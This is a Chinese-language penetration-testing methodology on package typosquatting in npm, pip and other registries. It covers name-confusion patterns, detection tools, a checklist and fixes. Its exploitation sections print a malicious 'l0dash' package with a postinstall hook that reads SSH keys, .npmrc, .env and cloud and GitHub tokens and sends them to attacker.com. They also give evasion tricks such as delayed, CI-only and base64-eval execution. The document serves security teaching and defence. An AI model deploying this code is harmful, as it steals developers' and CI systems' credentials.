# 包名混淆攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的包名混淆（Typosquatting）攻击检测和利用流程。

## 1.2 适用范围

本文档适用于使用包管理器（npm、pip、Maven、RubyGems 等）的软件项目。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

包名混淆（Typosquatting）是指攻击者在公共包仓库中注册与流行包名相似但略有不同的包名，诱使开发者误安装恶意包。

**本质问题**：
- 开发者输入错误
- 包名验证缺失
- 自动化工具盲目信任

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-494 | 下载代码 without 完整性检查 |
| CWE-829 | 从不可信控制域包含功能 |

## 2.2 攻击常见于哪些业务场景

| 包管理器 | 风险点 | 潜在危害 |
|---------|-------|---------|
| npm | 流行包名混淆 | 恶意代码执行 |
| pip | Python 包混淆 | 凭证窃取 |
| RubyGems | Ruby gem 混淆 | 后门植入 |
| Maven | Java 库混淆 | 供应链污染 |
| NuGet | .NET 包混淆 | 恶意代码执行 |

## 2.3 漏洞发现方法

### 2.3.1 常见混淆模式

```bash
# 字符重复
lodash → l0dash
requests → requestss

# 字符删除
express → expres
jquery → jquey

# 字符交换
webpack → wepback
axios → aixos

# 相似字符替换
react → reaсt (使用西里尔字母 с)
lodash → 1odash (使用数字 1)

# 添加后缀/前缀
underscore → underscore-js
moment → momentjs
```

### 2.3.2 自动化检测工具

```bash
# 使用 npm-audit 检查
npm audit

# 使用 pip-audit 检查
pip-audit

# 使用 Socket.dev 检测
# 在线包安全分析服务

# 使用 Snyk 检测
snyk test
```

### 2.3.3 手动检查

```bash
# 检查 package.json 中的依赖
cat package.json | grep dependencies

# 验证包名拼写
# 对比官方文档的包名
# 检查包下载量和评价
```

## 2.4 漏洞利用方法

### 2.4.1 恶意包发布

```javascript
// package.json 示例
{
  "name": "l0dash",  // 混淆 lodash
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node .hooks/exfil.js"
  }
}

// exfil.js - 窃取凭证
const fs = require('fs');
const https = require('https');

// 窃取 .npmrc、.ssh 等敏感文件
const files = ['~/.npmrc', '~/.ssh/id_rsa', '.env'];
files.forEach(f => {
    try {
        const content = fs.readFileSync(f);
        https.get(`https://attacker.com/steal?f=${f}&d=${content}`);
    } catch(e) {}
});
```

### 2.4.2 凭证窃取

```javascript
// 窃取环境变量中的凭证
const creds = {
    NPM_TOKEN: process.env.NPM_TOKEN,
    AWS_ACCESS_KEY: process.env.AWS_ACCESS_KEY_ID,
    AWS_SECRET_KEY: process.env.AWS_SECRET_ACCESS_KEY,
    GITHUB_TOKEN: process.env.GITHUB_TOKEN
};

// 发送到攻击者服务器
https.get(`https://attacker.com/creds?data=${JSON.stringify(creds)}`);
```

### 2.4.3 供应链污染

```
攻击流程：
1. 发布混淆包到公共仓库
2. 等待开发者误安装
3. 恶意代码在构建时执行
4. 窃取 CI/CD 凭证
5. 污染构建产物
6. 影响最终用户
```

## 2.5 漏洞利用绕过方法

### 2.5.1 检测规避

```javascript
// 延迟执行
setTimeout(() => {
    executeMaliciousPayload();
}, 3600000);  // 1 小时后

// 条件执行
if (process.env.CI === 'true') {
    // 仅在 CI/CD 环境执行
    stealCredentials();
}

// 代码混淆
// 使用 Base64 编码恶意代码
eval(Buffer.from('bWFsaWNpb3VzX2NvZGU=', 'base64').toString());
```

### 2.5.2 伪装正常功能

```javascript
// 包提供正常功能，同时执行恶意代码
const lodash = require('lodash');  // 实际加载 lodash

// 但在加载时执行恶意代码
// postinstall 脚本中
module.exports = lodash;  // 导出正常功能
```

---

# 第三部分：附录

## 3.1 包名混淆测试检查清单

```
□ 检查依赖包名拼写
□ 对比官方包名
□ 检查包下载量
□ 检查包评价和评论
□ 检查发布者信息
□ 检查 postinstall 脚本
□ 使用自动化工具扫描
```

## 3.2 常见混淆包示例

| 正常包 | 混淆包 |
|-------|-------|
| lodash | l0dash, lodashjs, lodash-js |
| requests | requestss, request-js |
| express | expres, expressjs |
| react | reaсt, reactjs |
| axios | aixos, axois |
| moment | momentjs, moment-js |
| underscore | underscorejs, underscore-js |

## 3.3 修复建议

1. **仔细检查包名** - 安装前验证包名拼写
2. **使用锁定文件** - package-lock.json 等
3. **启用双因素认证** - 包发布者账户
4. **使用私有仓库** - 内部包使用私有源
5. **自动化检测** - 使用工具扫描依赖

---

**参考资源**：
- [OWASP Software Supply Chain Security](https://owasp.org/www-project-software-supply-chain-security/)
- [npm Typosquatting](https://blog.npmjs.org/post/163723642530/crossenv-malware-on-the-npm-registry.html)
